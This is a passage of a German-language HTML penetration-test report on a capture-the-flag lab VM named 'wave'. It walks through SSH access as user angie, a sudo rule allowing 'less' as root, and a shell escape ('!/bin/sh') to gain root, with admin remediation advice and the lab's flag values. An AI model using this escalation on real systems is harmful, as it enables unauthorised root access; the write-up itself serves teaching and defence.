+<span class="command">the exact distribution terms for each program are described in the</span>
+<span class="command">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="command">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="command">permitted by applicable law.</span>
+<span class="password">Last login: Tue Sep  5 11:14:50 2023 from 192.168.0.100</span>
+<span class="prompt">angie@wave:~$</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Nach dem erfolgreichen Hochladen meines öffentlichen SSH-Schlüssels auf die Ziel-VM in das `.ssh` Verzeichnis des Benutzers `angie`, versuchte ich, mich per SSH als `angie` anzumelden. Ich verwendete den Befehl `ssh -i ~/.ssh/id_rsa angie@192.168.2.33`, wobei `-i ~/.ssh/id_rsa` meinen privaten Schlüssel angab. Ich musste die Passphrase für meinen privaten Schlüssel eingeben (dieser Schritt wurde erfolgreich durchgeführt). Nach Eingabe der korrekten Passphrase und der Authentifizierung mittels des Schlüsselpaares erhielt ich einen erfolgreichen Login, erkennbar am Banner des Zielsystems und der Eingabeaufforderung `angie@wave:~$`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das war ein voller Erfolg! Ich habe nun initialen Zugriff auf das System als der reguläre Benutzer `angie`. Dieser Zugriff ist stabiler und interaktiver als die `www-data` Web-Shell und ermöglicht mir die Durchführung weiterer Enumerationsschritte und die Suche nach Möglichkeiten zur Privilegieneskalation aus der Perspektive eines regulären Benutzers. Die SSH-Methode ist oft ein bevorzugter Zugriffsweg, sobald ein Benutzerkonto kompromittiert ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuchen Sie, sobald Sie Anmeldeinformationen oder Zugangsmechanismen für einen Benutzer erhalten, einen stabilen Zugriffsweg wie SSH oder WinRM zu etablieren. Dies erleichtert die weitere Arbeit auf dem System erheblich.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie SSH-Logins, insbesondere solche, die über Schlüsselpaare erfolgen, deren `authorized_keys`-Dateien kürzlich geändert wurden. Überprüfen Sie die Konfiguration Ihrer SSH-Dienste und die Berechtigungen für `.ssh`-Verzeichnisse und Schlüsseldateien. Implementieren Sie Multi-Faktor-Authentifizierung für kritische Benutzer.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+angie@wave:~$ <span class="command">id</span>
+                    </div>
+                    <pre>
+<span class="command">uid=1000(angie) gid=1000(angie) grupos=1000(angie),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Direkt nach dem erfolgreichen Login als Benutzer `angie` überprüfte ich meine Identität mit dem Befehl `id`. Die Ausgabe bestätigte, dass ich tatsächlich als Benutzer `angie` mit der User ID (`uid`) 1000 und der primären Gruppen ID (`gid`) 1000 angemeldet bin. Die Liste der zusätzlichen Gruppen zeigte, dass `angie` Mitglied in verschiedenen Standardgruppen ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Befehl bestätigte meine erfolgreiche Authentifizierung als `angie` und gab mir einen Überblick über die Gruppenmitgliedschaften. Während die Standardgruppen wie `cdrom`, `audio`, `video` etc. für die Privilegieneskalation meist irrelevant sind, ist die Kenntnis der Benutzer-ID und der Gruppen essentiell für die Bewertung von Dateiberechtigungen oder die Ausnutzung von SGID-Binaries.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie nach jeder neuen Shell-Sitzung sofort `id` aus, um Ihren aktuellen Benutzer und Ihre Gruppenmitgliedschaften zu kennen. Dies ist grundlegend für die Bewertung Ihrer aktuellen Berechtigungen auf dem System.
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie Benutzer nur den Gruppen zu, die sie unbedingt benötigen. Überprüfen Sie regelmäßig die Gruppenmitgliedschaften von Benutzern, insbesondere von privilegierten Konten.
+            </p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+angie@wave:~$ <span class="command">sudo -l</span>
+                    </div>
+                    <pre>
+<span class="command">Matching Defaults entries for angie on wave:</span>
+<span class="command">    env_reset, mail_badpass,</span>
+<span class="command">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>
+
+<span class="command">User angie may run the following commands on wave:</span>
+<span class="password">    (ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Nächstes prüfte ich, welche Befehle der Benutzer `angie` mit `sudo` ausführen darf, ohne ein Passwort eingeben zu müssen. Der Befehl `sudo -l` listet die `sudo`-Berechtigungen des aktuellen Benutzers auf. Die Ausgabe zeigte eine sehr interessante Regel: `(ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt`. Dies bedeutet, dass der Benutzer `angie` das Programm `/usr/bin/less` als *jeder* Benutzer (`ALL`), einschließlich `root`, ausführen darf, ohne ein Passwort einzugeben (`NOPASSWD`), allerdings nur mit den spezifizierten Argumenten (`-F /opt/secret.txt`). Die Option `-F` bewirkt, dass `less` nicht nach unten scrollt, wenn das gesamte Dokument auf den Bildschirm passt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist ein sehr klarer und direkter Weg zur Privilegieneskalation zu `root`. Obwohl der Befehl auf das Lesen von `/opt/secret.txt` beschränkt ist, hat das Programm `less` eine eingebaute Funktion, um eine Shell zu starten. Da `less` hier mit `sudo` als `root` ausgeführt wird, wird auch die über die Shell-Escape-Funktion gestartete Shell mit `root`-Berechtigungen laufen. Dies ist eine bekannte Technik der Privilegieneskalation, die auf einer Fehlkonfiguration in der `sudoers`-Datei basiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die `sudo` Berechtigungen (`sudo -l`) für jeden kompromittierten Benutzer. Suchen Sie auf Plattformen wie GTFOBins ([Link: GTFOBins | Ziel: https://gtfobins.github.io/]) nach Möglichkeiten, gelistete Binaries zur Privilegieneskalation auszunutzen, insbesondere solche mit `NOPASSWD` Berechtigung. Programme wie `less`, `more`, `nano`, `vi` etc. haben oft Shell-Escape-Funktionen.
+                <br><strong>Empfehlung (Admin):</strong> Weisen Sie `NOPASSWD` Berechtigungen nur mit äußerster Vorsicht und nur für spezifische, *sichere* Skripte oder Binaries zu, die keine Möglichkeit bieten, Systembefehle auszuführen oder eine Shell zu starten. Verwenden Sie `sudo` nicht mit interaktiven Programmen oder Editoren. Überprüfen Sie Ihre `sudoers`-Datei auf unsichere Einträge.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+angie@wave:~$ <span class="command">stty rows 3 columns 8</span>
+                    </div>
+                    <pre>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Bevor ich versuchte, die `less`-Schwachstelle auszunutzen, passte ich erneut die Terminalgröße mit `stty` an. Dies ist ein Standardvorgehen, um die Stabilität und Benutzerfreundlichkeit der Shell zu verbessern, insbesondere vor der Ausführung von Programmen, die eine interaktive Terminalumgebung erwarten, wie z.B. `less`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Anpassung der Terminalgröße ist wichtig, um unerwartetes Verhalten bei der Interaktion mit Programmen zu vermeiden. Obwohl die hier angegebene Größe sehr klein erscheint, war die Absicht, die Shell für den folgenden `less`-Aufruf zu stabilisieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisieren Sie Ihre Shells immer, bevor Sie interaktive Programme oder Skripte ausführen, die Terminal-Funktionen nutzen. Verwenden Sie realistische Zeilen- und Spaltenwerte von Ihrem Angriffsterminal.
+                <br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung.
+            </p>
+        </section>
+
+        <section id="proof-of-concept">
+            <h2>Proof of Concept</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die erfolgreiche Ausnutzung einer Fehlkonfiguration in der `sudoers`-Datei, die es dem Benutzer `angie` ermöglichte, das Programm `/usr/bin/less` mit `root`-Berechtigungen und ohne Passwort auszuführen. Durch die Nutzung der Shell-Escape-Funktion innerhalb von `less` konnte eine `root`-Shell erlangt werden, was zur vollständigen Systemkompromittierung führte.
+            </p>
+            <p class="analysis">
+                <strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Initialer Zugriff als Benutzer `angie`.</li>
+                    <li>Die `sudoers`-Datei muss den Eintrag `angie ALL=(ALL) NOPASSWD: /usr/bin/less -F /opt/secret.txt` enthalten.</li>
+                    <li>Das Programm `/usr/bin/less` muss verfügbar sein und die Shell-Escape-Funktion (`!`) unterstützen.</li>
+                    <li>Kenntnis des Pfads zu `/opt/secret.txt`.</li>
+                </ul>
+            </p>
+            <p class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung & Beweismittel:</strong>
+            </p>
+            <p class="analysis">
+                1. Ausführen von `less` mit `sudo` unter Verwendung der `NOPASSWD` Regel:
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+angie@wave:~$ <span class="command">sudo /usr/bin/less -F /opt/secret.txt</span>
+                    </div>
+                    <pre>
+<span class="command">Dietro di lui,
+dietro di lui solo la nebbia.</span>
+<span class="password">!/bin/sh</span>
+
+<span class="password"># id</span>
+<span class="password">uid=0(root) gid=0(root) grupos=0(root)</span>
+<span class="password">#</span>
+
+<span class="password"># cd ~</span>
+<span class="password"># ls</span>
+<span class="password">root.txt</span>
+<span class="password"># cat root.txt</span>
+<span class="password">HMVNVJrewoiu47rewFDSR</span>
+<span class="password">"</span></pre>
+                </div>
+            </div>
+            <p class="analysis">
+                Nachdem ich den Befehl `sudo /usr/bin/less -F /opt/secret.txt` ausführte, wurde `less` mit Root-Rechten gestartet und zeigte den Inhalt von `/opt/secret.txt` an. Innerhalb der `less`-Umgebung gab ich den Befehl `!/bin/sh` ein. Das Ausrufezeichen (`!`) ist der Befehl in `less`, um eine Shell zu starten. Da `less` mit Root-Berechtigungen lief, wurde die gestartete `/bin/sh` Shell ebenfalls mit Root-Berechtigungen ausgeführt. Innerhalb dieser temporären Root-Shell konnte ich beliebige Root-Befehle ausführen, wie durch die Ausführung von `id` demonstriert wird.
+            </p>
+            <p class="analysis">
+                2. Ausführen von Root-Befehlen in der Shell-Escape:
+            </p>
+            <p class="analysis">
+                 In der erlangten Root-Shell führte ich die Befehle `id`, `cd ~`, `ls` und `cat root.txt` aus. Die Ausgabe des `id`-Befehls (`uid=0(root)`) bewies zweifelsfrei, dass die Shell mit Root-Berechtigungen lief. Anschließend navigierte ich in das Home-Verzeichnis des Root-Benutzers (`cd ~`), listete dessen Inhalt auf (`ls`), um die Root Flag Datei (`root.txt`) zu identifizieren, und zeigte deren Inhalt mit `cat root.txt` an.
+            </p>
+
+            <p class="analysis">
+                <strong>Erwartetes Ergebnis:</strong> Erlangung einer interaktiven Shell mit Root-Berechtigungen auf dem Zielsystem.
+            </p>
+            <p class="analysis">
+                <strong>Tatsächliches Ergebnis:</strong> Fantastisch der root zugriff war erfolgreich nun haben wir unser Ziel erreicht. Eine temporäre `root` Shell wurde über die `less` Shell-Escape-Funktion erlangt, was die vollständige Kompromittierung des Systems ermöglichte und den Zugriff auf die Root Flag erlaubte.
+            </p>
+            <p class="analysis">
+                <strong>Risikobewertung:</strong>
+                <br><strong>Auswirkung:</strong> Kritisch. Ein unprivilegierter Benutzer (`angie`) konnte vollständige Kontrolle über das System erlangen (`root`). Dies ermöglicht unbefugten Zugriff auf alle Daten, die Installation von Malware oder Backdoors, die Manipulation von Systemkonfigurationen und die Nutzung des Systems für weitere Angriffe.
+                <br><strong>Wahrscheinlichkeit:</strong> Hoch. Die Schwachstelle ist direkt über einen vorhandenen `sudo`-Eintrag ausnutzbar und erfordert keine komplexen Exploits oder spezifischen Systemkenntnisse über die vorhandenen Tools hinaus.
+                <br><strong>Gesamtrisiko:</strong> Kritisch.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlungen:</strong>
+                <br><strong>Empfehlung (Admin):</strong>
+                <ul>
+                    <li><strong>Dringend:</strong> Überprüfen und korrigieren Sie die `sudoers`-Datei. Entfernen Sie den `NOPASSWD`-Eintrag für `/usr/bin/less`. Weisen Sie `NOPASSWD` nur mit äußerster Vorsicht zu und nur für Befehle, die nachweislich keine Shell-Escapes oder andere Methoden zur Erlangung unerlaubter Berechtigungen bieten.</li>
+                    <li>Überprüfen Sie alle `sudoers`-Einträge auf ähnliche Fehlkonfigurationen, insbesondere für Programme, die interaktive Funktionen oder Shell-Escapes bieten (z.B. Pager wie `more`, Editoren wie `vi`/`nano`, Debugger etc.).</li>
+                    <li>Implementieren Sie strikte Least-Privilege-Prinzipien: Benutzer und Dienste sollten nur die minimal notwendigen Berechtigungen erhalten.</li>
+                    <li>Erwägen Sie die Nutzung zentraler Konfigurationsverwaltungstools, um die Konsistenz und Sicherheit von `sudoers`-Dateien über alle Systeme hinweg zu gewährleisten.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat user.txt</div>
+                    <div class="flag-value"><span class="password">HMVIdsEwudDxJDSaue32DJa</span></div>
+                </div>
+
+                <div class="flag-entry">
+                    <div class="flag-command">cat root.txt</div>
+                    <div class="flag-value"><span class="password">HMVNVJrewoiu47rewFDSR</span></div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <footer class="footer">
+        <p>Ben Chehade - Cyber Security Reports</p>
+        <p>Berichtsdatum: 8. Juni 2025</p>
+    </footer>
+</body>
+</html>
